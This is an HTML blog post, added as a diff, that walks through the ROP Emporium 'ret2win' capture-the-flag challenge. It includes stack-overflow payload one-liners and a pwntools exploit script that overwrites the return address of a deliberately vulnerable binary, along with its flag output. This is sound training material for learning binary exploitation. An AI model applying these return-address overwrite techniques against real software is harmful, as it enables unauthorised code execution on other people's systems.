@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Day0 // Danil Delegator&#39;s Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.69.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Danil Delegator" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://danildelegator.github.io/css/main.min.61bb32028587f24ca28522d8d197970c7ef33284e5fffb45a75fcbbb2dbc4dcb.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Day0"/>
+<meta name="twitter:description" content="Day 0 Recently I encountered this post series by @int0x33 and felt inspired to do something similar. So i&rsquo;ve decided to post something new I learn or did every day for the next 100 days.
+So lets start from the first challenge @int0x33 did.
+First after running the binary we see it has a stack overflow. we confirm it by running: python3 -c &quot;print(&#39;A&#39;*40 &#43; &#39;B&#39;*4)&quot; | ./ret2win.
+If we do not know the offset of the ret address we can use gef&rsquo;s pattern create and pattern offset features."/>
+
+    <meta property="og:title" content="Day0" />
+<meta property="og:description" content="Day 0 Recently I encountered this post series by @int0x33 and felt inspired to do something similar. So i&rsquo;ve decided to post something new I learn or did every day for the next 100 days.
+So lets start from the first challenge @int0x33 did.
+First after running the binary we see it has a stack overflow. we confirm it by running: python3 -c &quot;print(&#39;A&#39;*40 &#43; &#39;B&#39;*4)&quot; | ./ret2win.
+If we do not know the offset of the ret address we can use gef&rsquo;s pattern create and pattern offset features." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://danildelegator.github.io/day0/" />
+<meta property="article:published_time" content="2020-04-15T11:45:03+03:00" />
+<meta property="article:modified_time" content="2020-04-15T11:45:03+03:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://danildelegator.github.io"><img class="app-header-avatar" src="/images/avatar.jpg" alt="Danil Delegator" /></a>
+      <h1>Danil Delegator&#39;s Blog</h1>
+      <p>This is not filled in yet.</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/DanilDelegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/DaDelegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://linkedin.com/in/Danil-Delegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Day0</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 15, 2020
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <h3 id="day-0">Day 0</h3>
+<p>Recently I encountered <a href="https://medium.com/@int0x33/day-1-rop-emporium-ret2win-64bit-bb0d1893a3b0">this</a> post series by <a href="https://medium.com/@int0x33">@int0x33</a> and felt inspired to do something similar. So i&rsquo;ve decided to post something new I learn or did every day for the next 100 days.</p>
+<p>So lets start from the <a href="https://medium.com/@int0x33/day-1-rop-emporium-ret2win-64bit-bb0d1893a3b0">first challenge</a> <a href="https://medium.com/@int0x33">@int0x33</a> did.</p>
+<p>First after running the binary we see it has a stack overflow. we confirm it by running:
+<code>python3 -c &quot;print('A'*40 + 'B'*4)&quot; | ./ret2win</code>.</p>
+<p>If we do not know the offset of the ret address we can use gef&rsquo;s <code>pattern create</code> and <code>pattern offset</code> features.</p>
+<p>Using <code>checksec</code> we can see that the binary does not have aslr or canary enabled but does have nx. This is consistent with a stackoverflow + rop challenge:
+<img src="/images/day0checksec.png" alt="checksec"></p>
+<p>So we try to find a &ldquo;gadget&rdquo; that we can point our overwritten return address to (no canary). We notice the function ret2win right away, Check what the address is (no aslr) and write a poc:
+<code>python3 -c &quot;print('A'*40 + '\x12\x08@\x00\x00\x00\x00\x00')&quot; | ./ret2win</code>.</p>
+<p>Now we write a nicer version using pwntools:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> struct
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
+<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recv())
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;l&#39;</span>, <span style="color:#ae81ff">0x400812</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvline())
+
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">output:
+</span><span style="color:#e6db74">[+] Starting local process &#39;./ret2win&#39;: pid 19317
+</span><span style="color:#e6db74">b&#34;ret2win by ROP Emporium</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">64bits</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">What could possibly go wrong?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You there madam, may I have your input please? And don&#39;t worry about null bytes, we&#39;re using fgets!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#34;
+</span><span style="color:#e6db74">b&#34;Thank you! Here&#39;s your flag:ROPE{a_placeholder_32byte_flag!}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
